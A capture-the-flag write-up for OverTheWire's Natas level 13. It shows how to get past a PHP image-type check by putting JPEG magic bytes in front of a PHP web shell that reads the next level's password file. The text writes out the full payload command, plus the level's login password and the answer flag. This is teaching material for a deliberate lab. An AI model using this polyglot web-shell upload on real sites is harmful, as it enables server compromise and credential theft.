# CHALLENGE
Access next level's password. \
Password:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC \
Username: natas13 \
URL:      http://natas13.natas.labs.overthewire.org
# SOLUTION
1.Login \
<img width="963" height="429" alt="image" src="https://github.com/user-attachments/assets/e774aa34-d037-4be6-9a4f-ddb23a8fca39" /> \
2.View source code. \
<img width="961" height="759" alt="image" src="https://github.com/user-attachments/assets/8a72afa8-dec1-4b09-bb7a-fa61489f0c26" /> \
3.Interpretation. \
 - JUst like natas12,You have to change the file extension to .php
 - The challenge is use of "(! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {",which checks the validity of the image file.
 - So we have to show that the file uploaded is an image.
 - How do we do that?
 -  - we have to create a php file but before the shell,we need to insert typical image bytes so when the server checks the first few line of the image it concludes its an image.
    - Then we can upload and get our file which will lead us to the password.
    - An ice breaker:Have you ever opened and image with a text editor and it displayed greek writtings instead of an image,thats what we will do. \

4.Create the payload. \
payload:  echo -e "\xFF\xD8\xFF\xE0<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>" > shell_image.php \
<img width="948" height="212" alt="image" src="https://github.com/user-attachments/assets/104b6de6-2ae3-4aab-ae37-3a9b2f07b874" /> \
5.Change the file extension to .php \
<img width="355" height="378" alt="image" src="https://github.com/user-attachments/assets/81e1cc0f-05cc-4b0f-aee1-ba831f4acdc2" /> \
6.Upload our file. \
<img width="957" height="306" alt="image" src="https://github.com/user-attachments/assets/408d9f47-2a56-4f78-a132-c7cf0bf85c59" /> \
7.Get the what? \
<img width="620" height="101" alt="image" src="https://github.com/user-attachments/assets/2c31e46a-af30-444c-95fc-2a201d6abd31" />
# Flag: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ






 


